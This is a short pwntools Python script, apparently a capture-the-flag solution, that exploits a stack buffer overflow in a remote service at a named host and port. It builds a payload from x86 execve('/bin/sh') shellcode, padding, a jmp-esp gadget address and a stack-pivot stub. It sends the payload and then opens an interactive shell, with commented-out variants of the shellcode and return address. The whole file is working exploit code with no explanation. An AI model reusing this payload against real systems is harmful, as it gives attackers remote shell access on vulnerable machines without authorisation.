from pwn import *
context(os='linux', arch='i386', log_level='debug')
sh = remote('vps1.blue-whale.me',9992)

#shellcode='s\x00'+asm(shellcraft.sh())
#buf2_addr = 0xffffd51c		
#payload=shellcode+'a'*(0x1c+0x04-len(shellcode))+p32(buf2_addr)

#shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
sub_esp_jmp = asm('sub esp, 0x24;jmp esp')
jmp_esp = 0x08048667
payload = shellcode + 'a'* (32-len(shellcode)) +p32(jmp_esp)+sub_esp_jmp
#buf_address='\xff\xff\xd5\x1c'
#buf_address='\xc1\x5d\xff\xff'
#payload = shellcode + 'a'* (32-len(shellcode)) + buf_address
sh.recvuntil('input your name')
sh.sendline(payload)
sh.interactive()
